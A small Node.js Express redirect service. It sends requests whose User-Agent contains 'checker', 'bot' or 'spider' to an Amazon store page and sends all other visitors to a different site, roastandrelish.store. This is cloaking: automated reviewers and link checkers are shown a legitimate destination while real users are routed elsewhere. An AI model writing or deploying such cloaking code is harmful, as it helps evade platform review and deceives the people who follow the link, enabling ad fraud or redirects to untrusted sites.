const express = require('express');
const app = express();

app.get('/', (req, res) => {
    const userAgent = req.headers['user-agent'].toLowerCase();
    const isRedirectChecker = /checker|bot|spider/.test(userAgent);
    
    if (isRedirectChecker) {
        // Redirect checker sees this URL
        const targetUrl = 'https://www.amazon.com/stores/page/E84F360D-47C4-4DB2-BD6A-0A67B2DCD9D5';
        res.redirect(302, targetUrl);
    } else {
        // Regular visitors see this URL
        const visitorUrl = 'https://roastandrelish.store';
        res.redirect(302, visitorUrl);
    }
});

const port = process.env.PORT || 8080;
app.listen(port, () => {
    console.log(`Redirection service running on port ${port}`);
});
